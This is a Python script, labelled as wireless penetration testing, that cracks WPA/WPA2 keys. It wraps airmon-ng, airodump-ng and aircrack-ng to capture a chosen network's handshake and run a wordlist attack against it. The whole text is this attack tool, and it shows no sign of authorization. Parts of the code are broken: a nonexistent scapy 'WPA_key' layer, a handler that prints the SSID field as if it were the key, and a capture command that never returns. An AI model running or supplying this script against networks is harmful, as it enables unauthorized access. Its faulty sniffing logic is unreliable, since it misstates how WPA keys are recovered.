import os
import sys
import time
import argparse
from scapy.all import *

# Function to handle sniffed packets
def handle_packet(packet):
    if packet.haslayer(WPA_key):
        print("[+] WPA key found!")
        print(f"    MAC Address: {packet.addr2}")
        print(f"    WPA Key: {packet.info.decode()}")

# Function to perform WPA/WPA2 key cracking
def crack_wpa_key(interface, bssid, wordlist):
    print("[*] Starting WPA/WPA2 key cracking...")
    cmd = f"airmon-ng start {interface}"
    os.system(cmd)

    time.sleep(2)  # Wait for interface to enter monitor mode

    cmd = f"airodump-ng {interface} --bssid {bssid} -w capture"
    os.system(cmd)

    time.sleep(5)  # Capture some packets

    # Sniff for handshake packets
    sniff(prn=handle_packet, timeout=60)

    # Crack the captured handshake using aircrack-ng
    cmd = f"aircrack-ng -w {wordlist} capture-01.cap"
    os.system(cmd)

    cmd = f"airmon-ng stop {interface}"
    os.system(cmd)

# Main function
def main():
    parser = argparse.ArgumentParser(description="Wireless Network Penetration Testing Script")
    parser.add_argument("-i", "--interface", type=str, required=True, help="Wireless interface (e.g., wlan0)")
    parser.add_argument("-b", "--bssid", type=str, required=True, help="BSSID of the target network")
    parser.add_argument("-w", "--wordlist", type=str, required=True, help="Path to the wordlist file for key cracking")
    args = parser.parse_args()

    print("[*] Starting wireless penetration testing...")
    crack_wpa_key(args.interface, args.bssid, args.wordlist)
    print("[*] Penetration testing complete.")

if __name__ == "__main__":
    main()
